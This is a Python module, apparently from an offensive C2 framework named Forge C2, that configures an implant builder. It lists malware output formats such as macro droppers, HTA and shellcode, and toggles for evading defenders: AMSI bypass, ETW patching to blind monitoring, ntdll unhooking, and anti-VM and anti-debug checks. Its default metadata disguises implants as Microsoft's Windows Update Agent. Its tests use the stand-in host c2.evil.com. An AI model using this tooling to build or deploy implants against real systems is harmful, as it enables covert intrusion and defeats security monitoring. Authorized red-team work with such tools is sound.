"""
Forge C2 — Implant Configuration
====================================
Configuration dataclasses and enums for the implant builder.

Defines every knob the operator can twist when generating
an implant: architecture, format, transport, sleep, evasion,
obfuscation, and compile-time constants.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import os
import secrets
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class ImplantOS(str, Enum):
    """Target operating system."""
    WINDOWS = "windows"
    LINUX   = "linux"
    MACOS   = "macos"


class ImplantArch(str, Enum):
    """Target CPU architecture."""
    X64   = "x64"
    X86   = "x86"
    ARM64 = "arm64"


class ImplantFormat(str, Enum):
    """Output artifact format."""
    EXE         = "exe"          # Windows PE executable
    DLL         = "dll"          # Windows DLL (rundll32, side-load)
    SERVICE_EXE = "service_exe"  # Windows service executable
    SHELLCODE   = "shellcode"    # Raw position-independent shellcode
    POWERSHELL  = "powershell"   # PowerShell script (.ps1)
    HTA         = "hta"          # HTML Application (mshta.exe)
    VBA         = "vba"          # VBA macro (Office dropper)
    CSHARP      = "csharp"       # C# assembly (execute-assembly)
    ELF         = "elf"          # Linux ELF executable
    SO          = "so"           # Linux shared object
    MACHO       = "macho"        # macOS Mach-O executable
    RAW         = "raw"          # Raw bytes (for custom loaders)


class ObfuscationLevel(str, Enum):
    """Code obfuscation intensity."""
    NONE    = "none"       # No obfuscation (debug builds)
    LIGHT   = "light"      # Variable renaming, string encrypt
    MEDIUM  = "medium"     # + control flow flattening, dead code
    HEAVY   = "heavy"      # + metamorphic transforms, anti-disasm
    PARANOID = "paranoid"  # Kitchen sink — slow but mean


class SleepTechnique(str, Enum):
    """How the implant sleeps between check-ins."""
    STANDARD       = "standard"          # Simple Sleep() / usleep()
    EKKO           = "ekko"              # Ekko sleep (ROP-based, stack encrypt)
    FOLIAGE        = "foliage"           # Foliage (APC-based, timer queue)
    DEATH_SLEEP    = "death_sleep"       # Death sleep (unhook & re-hook ntdll)
    THREAD_POOL    = "thread_pool"       # Timer callback via thread pool
    WAITABLE_TIMER = "waitable_timer"    # NtCreateWaitableTimer


@dataclass
class ImplantConfig:
    """Master configuration for implant generation.

    Every field maps to a compile-time or runtime constant
    that gets baked into the generated implant.

    Attributes:
        name:               Implant project name (for tracking).
        target_os:          Target operating system.
        arch:               Target CPU architecture.
        output_format:      Output artifact format (exe, dll, ps1, etc.).

        c2_host:            C2 server address.
        c2_port:            C2 server port.
        c2_transport:       Transport type (http, https, dns, tcp, smb).
        c2_profile:         Malleable C2 profile name.
        domain_front:       Domain fronting host (empty = none).
        proxy_url:          Proxy URL for egress (empty = direct).

        sleep_seconds:      Default sleep interval.
        jitter_pct:         Sleep jitter percentage.
        sleep_technique:    How to sleep (standard, ekko, foliage, etc.).
        kill_date:          ISO date string after which implant self-destructs.
        max_retries:        Max failed check-ins before exit.

        obfuscation:        Obfuscation level.
        encrypt_strings:    Encrypt all strings at compile time.
        anti_debug:         Embed anti-debugging checks.
        anti_vm:            Embed anti-VM/sandbox detection.
        anti_emulation:     Timing-based anti-emulation checks.
        unhook_ntdll:       Unhook ntdll.dll on startup (EDR bypass).
        amsi_bypass:        Embed AMSI bypass (PowerShell/C#).
        etw_bypass:         Patch ETW to blind defenders.
        syscall_direct:     Use direct syscalls (skip ntdll hooks).
        stack_spoof:        Spoof call stack for thread inspection.

        user_agent:         Custom User-Agent string.
        custom_headers:     Extra HTTP headers.
        pipe_name:          SMB named pipe name.
        dns_domain:         DNS C2 domain.

        watermark:          Unique watermark for tracking (auto-generated).
        compile_flags:      Extra compiler flags.
        icon_path:          Windows icon file path (.ico).
        version_info:       PE version info fields.
    """
    # ── Identity ──────────────────────────────────────────────────────
    name:             str = "forge_implant"
    target_os:        ImplantOS = ImplantOS.WINDOWS
    arch:             ImplantArch = ImplantArch.X64
    output_format:    ImplantFormat = ImplantFormat.EXE

    # ── C2 Connection ─────────────────────────────────────────────────
    c2_host:          str = "127.0.0.1"
    c2_port:          int = 443
    c2_transport:     str = "https"
    c2_profile:       str = "default"
    domain_front:     str = ""
    proxy_url:        str = ""

    # ── Timing ────────────────────────────────────────────────────────
    sleep_seconds:    float = 60.0
    jitter_pct:       float = 20.0
    sleep_technique:  SleepTechnique = SleepTechnique.STANDARD
    kill_date:        str = ""              # ISO format: "2026-12-31"
    max_retries:      int = 100

    # ── Evasion ───────────────────────────────────────────────────────
    obfuscation:      ObfuscationLevel = ObfuscationLevel.MEDIUM
    encrypt_strings:  bool = True
    anti_debug:       bool = True
    anti_vm:          bool = True
    anti_emulation:   bool = False
    unhook_ntdll:     bool = False
    amsi_bypass:      bool = True
    etw_bypass:       bool = True
    syscall_direct:   bool = False
    stack_spoof:      bool = False

    # ── Transport-specific ────────────────────────────────────────────
    user_agent:       str = ""
    custom_headers:   dict[str, str] = field(default_factory=dict)
    pipe_name:        str = "msagent_47"
    dns_domain:       str = ""

    # ── Build ─────────────────────────────────────────────────────────
    watermark:        str = field(default_factory=lambda: secrets.token_hex(8))
    compile_flags:    list[str] = field(default_factory=list)
    icon_path:        str = ""
    version_info:     dict[str, str] = field(default_factory=lambda: {
        "CompanyName": "Microsoft Corporation",
        "FileDescription": "Windows Update Agent",
        "FileVersion": "10.0.19041.1",
        "ProductName": "Microsoft Windows",
        "OriginalFilename": "wuauclt.exe",
    })

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "target_os": self.target_os.value,
            "arch": self.arch.value,
            "output_format": self.output_format.value,
            "c2_host": self.c2_host,
            "c2_port": self.c2_port,
            "c2_transport": self.c2_transport,
            "c2_profile": self.c2_profile,
            "domain_front": self.domain_front,
            "sleep_seconds": self.sleep_seconds,
            "jitter_pct": self.jitter_pct,
            "sleep_technique": self.sleep_technique.value,
            "kill_date": self.kill_date,
            "obfuscation": self.obfuscation.value,
            "evasion": {
                "encrypt_strings": self.encrypt_strings,
                "anti_debug": self.anti_debug,
                "anti_vm": self.anti_vm,
                "anti_emulation": self.anti_emulation,
                "unhook_ntdll": self.unhook_ntdll,
                "amsi_bypass": self.amsi_bypass,
                "etw_bypass": self.etw_bypass,
                "syscall_direct": self.syscall_direct,
                "stack_spoof": self.stack_spoof,
            },
            "watermark": self.watermark,
        }

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> "ImplantConfig":
        """Create config from a dict (CLI args, JSON, etc.)."""
        evasion = data.get("evasion", {})
        return cls(
            name=data.get("name", "forge_implant"),
            target_os=ImplantOS(data.get("target_os", "windows")),
            arch=ImplantArch(data.get("arch", "x64")),
            output_format=ImplantFormat(data.get("output_format", "exe")),
            c2_host=data.get("c2_host", "127.0.0.1"),
            c2_port=data.get("c2_port", 443),
            c2_transport=data.get("c2_transport", "https"),
            c2_profile=data.get("c2_profile", "default"),
            domain_front=data.get("domain_front", ""),
            sleep_seconds=data.get("sleep_seconds", 60.0),
            jitter_pct=data.get("jitter_pct", 20.0),
            sleep_technique=SleepTechnique(data.get("sleep_technique", "standard")),
            kill_date=data.get("kill_date", ""),
            obfuscation=ObfuscationLevel(data.get("obfuscation", "medium")),
            encrypt_strings=evasion.get("encrypt_strings", True),
            anti_debug=evasion.get("anti_debug", True),
            anti_vm=evasion.get("anti_vm", True),
            amsi_bypass=evasion.get("amsi_bypass", True),
            etw_bypass=evasion.get("etw_bypass", True),
        )


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestImplantConfig:
    """Tests for implant configuration."""

    def test_defaults(self) -> None:
        cfg = ImplantConfig()
        assert cfg.target_os == ImplantOS.WINDOWS
        assert cfg.arch == ImplantArch.X64
        assert cfg.output_format == ImplantFormat.EXE
        assert cfg.sleep_seconds == 60.0
        assert len(cfg.watermark) == 16  # hex(8 bytes) = 16 chars

    def test_to_dict(self) -> None:
        cfg = ImplantConfig(c2_host="10.0.0.1", c2_port=8443)
        d = cfg.to_dict()
        assert d["c2_host"] == "10.0.0.1"
        assert d["c2_port"] == 8443
        assert "evasion" in d

    def test_from_dict(self) -> None:
        data = {
            "name": "test_implant",
            "target_os": "linux",
            "arch": "arm64",
            "output_format": "elf",
            "c2_host": "c2.evil.com",
        }
        cfg = ImplantConfig.from_dict(data)
        assert cfg.target_os == ImplantOS.LINUX
        assert cfg.arch == ImplantArch.ARM64
        assert cfg.output_format == ImplantFormat.ELF

    def test_watermark_unique(self) -> None:
        c1 = ImplantConfig()
        c2 = ImplantConfig()
        assert c1.watermark != c2.watermark
